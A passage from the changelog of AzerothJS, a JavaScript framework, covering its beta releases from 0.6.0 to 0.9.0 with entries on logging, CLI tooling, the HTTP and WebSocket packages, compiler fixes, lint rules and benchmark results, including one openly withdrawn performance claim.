  interval, `flush()`/`close()`, and process exit; overflow and write failures DROP and
  are counted (one stderr notice + an in-band `log lines dropped` record on recovery) -
  logging never blocks the event loop and never breaks the app. `fileSink()` is the
  record-level form and `teeSink(...sinks)` fans out with per-sink throw isolation
  (pretty console + file is the canonical pair). Used as the logger's `stream`, the
  fused fast path is untouched: emit benchmarks are unchanged, and file throughput
  measured ~10x pino's default file destination (~6x its async mode, at a fraction of
  the memory) on the reference machine.

- `@azerothjs/cli`: the `azeroth` command line - `dev` (the fullstack conductor: compiler
  watch when decorators demand one, `node --watch` gated on the first emit, and vite, under
  one banner with prefixed output), `check` (every gate the project's shape demands),
  `build` (artifacts in dependency order; a native backend deliberately has none), `doctor`
  (a catalog of real-world failure diagnoses), and `info`. No config file - the project's
  shape (frontend / backend native-vs-built / fullstack) is detected from what already
  exists, and ambiguity fails loud with `--app`/`--server` to disambiguate. `--print` on any
  orchestrating command prints the exact child invocations and exits: children are always
  `node <absolute script>` from the project's own node_modules - never a shell, never a cmd
  shim - so there is nothing hidden and nothing to eject.
- `create-azeroth`: `npm create azeroth@latest` - the day-one path. Three templates
  (frontend / backend / fullstack), at most two questions, opinions in the templates
  instead (eslint with the azeroth rules, the `azeroth-tsc` gate, the CLI verbs as
  scripts, the vite proxy line in plain sight). The backend template has no build step;
  the fullstack template is `application/` + `server/` workspaces under one root where
  one `npm run dev` runs both halves.

- `@azerothjs/http`: `new App({ serializeError })` reshapes the error wire body so an app can
  speak its own envelope (`{ success, code, field, message }`, JSON:API, ...) without
  reimplementing the one error path. The hook returns a plain value to replace the body (the
  kernel keeps the error's status and mandated headers - a 405 `Allow`, a 429 `Retry-After`), a
  `Response` for full control, or `undefined` to keep the default `{ error: { code, message } }`.
  It applies uniformly to every error, route-miss 404s included; a throwing serializer falls back
  to the default shape, so the last-resort error path can never break.
- `@azerothjs/http`: `app.with(middleware)` opens a SCOPED registration view - the middleware runs
  only for the routes registered through the returned app, not globally like `use`. It shares the
  parent's route table, chains (`app.with(throttle).with(auth).get(...)`) with full context-type
  accumulation, and never mutates the parent (a later `app.use` does not reach into an already-opened
  fork). Removes the per-handler guard-call boilerplate when only some routes need auth/throttle.

## [0.9.0-beta.4] - 2026-07-21

### Added

- The backend stack is now published to npm: `@azerothjs/http` (web-standard
  HTTP kernel), `@azerothjs/ws` (RFC 6455 WebSockets), `@azerothjs/api`
  (contract-first, type-safe API layer), and `@azerothjs/cron` (zero-dependency
  scheduler). They were previously private and consumable only via vendored
  tarballs; a clean `npm install @azerothjs/http` now resolves.

## [0.9.0-beta.3] - 2026-07-20

### Added

- `azeroth/unsafe-narrow-in-show` lint rule: flags `guard()!.x` inside a
  `<Show when={ guard() }>` whose children read the guarded value a second time
  via non-null assertion instead of using the callback form. That second read is
  independent of the one `when` already checked and can observe `null` even
  while the branch is mounted - `!` is erased at compile time, so it gives no
  runtime protection. Surfaces through `eslint .`, the Vite build, and editor
  diagnostics alike, with no separate wiring (it lives in the shared markup
  lint pass all three already read from).

### Fixed

- Reactive DOM attribute bindings written as a function literal or a bare
  getter reference (`class={ () => ... }`, `class={ computeClass }`) now
  update correctly. Dependency analysis cannot see reactive reads hidden
  inside those forms, so they previously rendered once and silently stopped
  reacting.
- `<ErrorBoundary>` no longer crashes ("insertBefore: parameter 1 is not of
  type 'Node'") when `children`/`fallback` resolves to a thunk chain (a
  function returning a function) instead of an already-built node.
- The Vite dev server's incremental type checker no longer serves stale
  diagnostics after editing a plain `.ts` dependency mid-session - file
  watcher changes now invalidate the checker's cached snapshot instead of
  pinning to the first-seen copy for the rest of the session.
- Same-line whitespace between inline markup children (`{ label } <span>`) is
  preserved as a single space instead of being dropped, which previously
  fused neighboring inline content together.
- `<Transition>` now warns once when its target has `display: contents`
  (which generates no box, so transform/opacity never paint and
  `transitionend` never fires) instead of silently snapping at the timeout
  fallback with no explanation.
- The packaged VS Code extension ships with its icon again (a missing build
  step left it out).

## [0.9.0-beta.2] - 2026-07-19

### Fixed

- Renderer `bindContent` now resolves a `children` thunk to its node instead of
  stringifying the function, so a component handed a function-returning-node as
  its children renders correctly.

## [0.9.0-beta.1] - 2026-07-19

### Added

- Route transitions: `<Routes transition="page">` animates route swaps with
  `<Transition>`'s 6-class family - the outgoing route plays its leave (removal
  deferred until it completes) while the incoming enters alongside, so cross-fades
  and directional drifts are pure CSS. The function form receives
  `{ from, to, navigation }` and returns a name per swap (or null for instant),
  and the new `router.navigationKind()` reports what caused each change
  (`'push' | 'replace' | 'pop'`) - a back-navigation can animate differently
  than a forward one. Rapid navigation flushes still-leaving routes instantly.
- `<TransitionGroup>`: keyed list enter/leave animation - items play the enter
  family when their key joins and the leave family (removal deferred) when it
  departs. The primitive toast stacks and notification trays hand-roll today.
- Virtualization: `createVirtualizer` (headless, equality-guarded window memo -
  scrolling within the same window is a reactive non-event, closing the
  re-slice-per-scroll-frame trap) and `<VirtualList>` (the packaged vertical
  scroller: spacer, absolute row positioning, keyed reuse). Fixed row size and
  explicit viewport height in v1.
- [`@azerothjs/logger`](packages/logger), the framework's voice: one zero-dependency
  logger with two faces - colored, iconed developer output on a TTY and pino-class
  NDJSON in production - with child loggers whose bound context serializes once,
  free disabled levels (below-threshold methods ARE a no-op), field redaction that
  runs before any sink, Error serialization with the full `cause` chain, honest
  color rules (NO_COLOR/FORCE_COLOR/TTY), a browser console face, and
  `AZEROTH_LOG` environment control. Measured ahead of pino on every emit path and
  ~10x ahead of winston. It also ships the AzerothJS startup banner: `serve()` now
  announces the bound addresses and measured ready time on a dev terminal (silence
  it with `banner: false`; it is always silent piped or in production), the Vite
  dev server prints the same identity with the compiled component count, and
  `attachWebSockets` and the cron scheduler take a structural `logger` for
  lifecycle visibility (connections; job runs, overlap skips, failures) without
  either package gaining a dependency. The repository also carries the project
  mark (`assets/`) - now the VS Code extension icon AND the JetBrains plugin
  icon. The frontend runtime packages deliberately stay logger-free: hot-path
  browser code carries no logging weight.
- `jsonEncoder(schema)` in `@azerothjs/http`: compiles a response declaration (the same
  `@azerothjs/schema` combinators that validate request bodies) into a shape-specialized
  JSON serializer - key strings prebuilt, primitive fields quoted inline behind an
  escape guard, byte-identical output to `json(data)` for declared shapes, with
  JSON.stringify fallback for anything the declaration cannot describe. The
  declaration-driven twin of `readValidated`: one reads the boundary through the
  schema, the other writes it. Schema combinators now carry internal structural
  metadata to make this compile-from-declaration possible.
- Client-only builds: `azeroth({ ssr: false })` compiles every component without
  its SSR/hydration branch and substitutes a constant render mode, so the SSR
  machinery minifies out of the bundle entirely - the js-framework-benchmark app
  dropped from 24.0 kB to 16.1 kB (5.4 kB gzip). Leave the default on for any app
  that calls `renderToString`/`hydrate`.

### Changed

- `<Transition>` now CANCELS a mid-flight run when toggled instead of queueing:
  a half-entered sheet reverses from exactly where it is (same element, state
  preserved) - rapid open/close feels crisp instead of "finish, then reverse".
- Every class across the packages now keeps its internals in native `#` private
  fields instead of TypeScript's erased `private` keyword: internals are genuinely
  unreachable at runtime, so nothing internal can silently become load-bearing
  API. Code that reached into undocumented members via casts will now find them
  gone - they were never API.
- Compiled markup got materially faster, measured on
  [js-framework-benchmark](https://github.com/krausest/js-framework-benchmark)
  (keyed): CPU geometric mean went from 1.29x to 1.07x of hand-written vanilla
  DOM, ahead of React, Angular, and Vue and even with Solid and Ripple, with the
  field's best select-row, swap-rows, and first-paint numbers. The work behind it:
  - A text hole that is its element's only child (`<td>{ row.id }</td>`) compiles
    anchor-free: one text node driven in place, no comment-marker pair per hole.
  - A `<For>` row expression with no reactive reads (`{ row.id }`) binds once
    instead of carrying a per-row effect; reactivity is decided by expression
    shape, so getter calls (`{ row.label() }`) stay live.
  - Compiled event handlers on bubbling event types are now DELEGATED to one
    document-level listener per type (matching the documented template-path
    contract); non-bubbling types keep per-element listeners.
  - `<For>` clears and full replacements collapse to one bulk `textContent`
    write when the list spans its parent, and a two-row swap reconciles with two
    moves instead of a position map and LIS pass.
  - `destroyComponent` returns in constant time when no element anywhere holds a
    destroy hook - removing a thousand hook-free rows no longer walks each
    subtree.
  - Devtools registration records are only allocated while a devtools hook is
    attached, taking a per-signal/effect/root allocation off the hot paths.
  - A single `class:` toggle compiles to a bare conditional instead of an
    array/filter/join per evaluation.
- **WITHDRAWN - see the "Corrected (performance claims)" entry under [Unreleased].** The Fastify
  half of this claim does not reproduce: re-measured with this same methodology, `@azerothjs/http`
  is ~5% BEHIND Fastify on the five-scenario geomean, and was already ~2% behind before the
  security work. The Express/Koa/Nest half has not been re-measured. Left in place unedited below
  as the historical record of what was believed at this release.

- `@azerothjs/http` got faster on the wire, measured against Express, Koa, NestJS,
  and Fastify with autocannon (100 connections, interleaved same-machine A/B):
  ahead of Express/Koa/Nest on every scenario by wide margins, and ahead of
  Fastify on the five-scenario geometric mean (~4%) - winning JSON echo (+14%),
  param routes (+9%, via `jsonEncoder`), and 404 (+14%), behind only on
  hello-world (-9%) and a 5-deep middleware chain (-5%). Part of the hello gap is
  the per-request reactive root (request-isolated stores + guaranteed cleanup,
  which the others do not offer; measured at ~3%, opt out with
  `new App({ requestRoot: false })`). The work behind it:
  - Response bodies now travel as STRINGS all the way to the socket, where Node
    encodes natively during the write - no TextEncoder pass, no byte-array
    allocation per response; Content-Length comes from a native byte count.
    `PayloadResponse` encodes lazily for anything that genuinely reads bytes.
  - The per-route middleware chain runs SYNCHRONOUSLY while middlewares return
    plain values - no microtask hop per middleware per request; the first
    thenable result switches that request onto the promise path unchanged.
  - The request root stopped allocating per request: the dispatch closure and
    cleanup-error options are per-app now, and the cleanup registry only exists
    once a handler registers teardown.
  - Dispatch runs synchronously end to end for a handler that returns a plain
    Response - no promise machinery until something genuinely asynchronous
    (an async handler, or HEAD body cancellation) enters the path.
- `@azerothjs/ws` measured against the `ws` library and socket.io (echo, 1000-way
  broadcast, connection churn, 5000 idle connections): ahead of socket.io on every
  line, ahead of `ws` on single-connection echo and idle memory (-11%), even on
  the rest - no code changes needed.

## [0.8.0-beta.2] - 2026-07-17

### Changed

- `<Match when>` accepts any value and matches while it is truthy, exactly like
  `<Show when>` - `when={ phase() === 'connected' && activeConfig() }` no longer
  needs an explicit boolean coercion.
- CJS bundles (tsserver plugin, VS Code server) carry a real `import.meta.url`,
  anchoring native-TypeScript resolution at the installed bundle instead of the
  process working directory.
- Release flow retries the editor-lockfile sync while the npm registry catches up
  with a fresh publish, and runs it on resumed (`--no-bump`) releases too.

### Fixed

- Editor/CI type checking: a function literal passed to a factory prop
  (`<ErrorBoundary fallback={ (error, reset) => ... }>`) now takes its parameter
  types from the prop's declared signature instead of falling to implicit `any`
  under a strict tsconfig.
- Docs: `<For>`'s keyed row reuse - and how to keep row values live through
  getters - is now documented in the renderer README.

## [0.8.0-beta.1] - 2026-07-16

### Added

- The backend, published for the first time: [`@azerothjs/http`](packages/http)
  (zero-dependency, web-standard HTTP kernel - every request is a reactive root),
  [`@azerothjs/schema`](packages/schema) (validation whose TypeScript types are
  inferred from the declaration, shared by browser forms, the api client, and the
  server boundary), [`@azerothjs/api`](packages/api) (declare a contract once, get
  the server mount and a fully inferred client), [`@azerothjs/ws`](packages/ws)
  (RFC 6455 WebSocket server from scratch), and [`@azerothjs/cron`](packages/cron)
  (cron scheduling with honest timezone/DST semantics). Each stands alone; a
  backend-only service needs no frontend packages.
- Markup lint with autofix: spacing/punctuation rules for `.azeroth` interpolations
  run in the compiler's build-time lint and through the ESLint processor, and are
  fixable with `eslint --fix`.

### Changed

- **BREAKING:** `azerothjs` (unscoped) is now the framework's entry package and the
  compiler's code-generation target. Install `azerothjs` instead of `@azerothjs/core`
  and import from `'azerothjs'`; `@azerothjs/core` is removed and receives no further
  releases.
- **BREAKING:** a component with more than one top-level markup region is now a
  compile error (`azeroth/multiple-roots`). Previously every region except the last
  was silently discarded; wrap siblings in a single root element instead.
- Published type declarations are now compiled under `noUncheckedIndexedAccess`,
  `exactOptionalPropertyTypes`, and `isolatedDeclarations`: optional properties where
  absent and `undefined` mean the same thing are spelled `| undefined`, and indexed
  reads are guarded throughout the runtime.
- Validation rules (`required`, `email`, `phone`, the `countries` dataset, ...) moved
  to `@azerothjs/schema` as the single source of validation truth; `@azerothjs/form`
  re-exports them, so existing imports keep working.
- Mount points and route components are typed as `MountNode`
  (`HTMLElement | DocumentFragment`), so a component may render a fragment.
- Release flow publishes to npm before pushing the tag, so CI triggered by the push
  always finds the released versions on the registry.
- All READMEs rewritten for npm: root front page, `azerothjs` flagship page (now
  covering the server side), and per-package pages with install instructions;
  non-ASCII punctuation removed from authored text repo-wide.

### Fixed

- Compiler: a markup child expression starting on the line after its opening `{`
  compiled to a bare `return;` (JavaScript ASI), silently dropping the child - the
  classic symptom was `<For>` failing with "renderItem is not a function". Generated
  returns are parenthesized now, with a regression test.
- Reactivity: a truthy non-function value returned from an effect body (for example
  `createEffect(() => list.push(x))` - `push` returns a number) was registered as a
  cleanup and crashed the next run's cleanup pass; non-function returns are ignored.
- `.azeroth` parser: HTML comments (`<!-- -->`) now fail with a specific, actionable
  message instead of a generic markup parse error.
- Compiler README documented the explicit-dependency effect as `watch (deps)`; the
  keyword is `effect (deps)`.

## [0.7.0-beta.1] - 2026-07-02

### Added

- `form` keyword: first-class forms in `.azeroth` (`form f = shape with { ... }`),
  including the array form `form rows[]` for dynamic lists of repeated sub-forms.
- Form engine: cross-field validation (`validateForm`), per-field async validation
  (`validateAsync` with AbortSignal + debounce), numeric field coercion, and
  `createFieldArray`.
- Cross-language editor intelligence: Find References / Go to Definition / Rename
  across the `.ts` and `.azeroth` boundary in both editors, with result spans mapped
  to real source positions.
- `reactive` semantic-token modifier: names declared by reactive keywords get a
  distinct, themeable color in VS Code and JetBrains.
- JetBrains: usage-aware inspections (a `.ts` export used only from `.azeroth` files
  is no longer flagged unused) and `.azeroth`-aware Find Usages.
- Generated type projections (`.azeroth/types` mirror with declaration maps) so
  editors without tsserver-plugin support resolve `.azeroth` imports with full types.
- CI: editor plugins built, verified (JetBrains Plugin Verifier), and attached to
  GitHub Releases; typecheck and coverage gates.

### Changed

- **BREAKING:** published packages require Node >= 24.
- `props {}` blocks removed: component props are standard TypeScript parameters.
- `watch` folded into `effect (deps)`; `bind:` on components lowers to
  `value` + `on<Prop>Change`.

## [0.6.0-beta.1] - 2026-06-21

- Component-only `.azeroth` authoring model, unified compiler IR, and the rebuilt
  editor tooling stack (language service, language server, VS Code extension,
  JetBrains plugin, tsserver plugin, ESLint processor).

[Unreleased]: https://github.com/AzerothJS/AzerothJS/compare/v1.1.0...HEAD
[1.1.0]: https://github.com/AzerothJS/AzerothJS/compare/v1.0.0...v1.1.0
[1.0.0]: https://github.com/AzerothJS/AzerothJS/compare/v1.0.0-beta.2...v1.0.0
[1.0.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v1.0.0-beta.1...v1.0.0-beta.2
[1.0.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.4...v1.0.0-beta.1
[0.9.0-beta.4]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.3...v0.9.0-beta.4
[0.9.0-beta.3]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.2...v0.9.0-beta.3
[0.9.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.1...v0.9.0-beta.2
[0.9.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.8.0-beta.2...v0.9.0-beta.1
[0.8.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v0.8.0-beta.1...v0.8.0-beta.2
[0.8.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.7.0-beta.1...v0.8.0-beta.1
[0.7.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.6.0-beta.1...v0.7.0-beta.1
[0.6.0-beta.1]: https://github.com/AzerothJS/AzerothJS/releases/tag/v0.6.0-beta.1
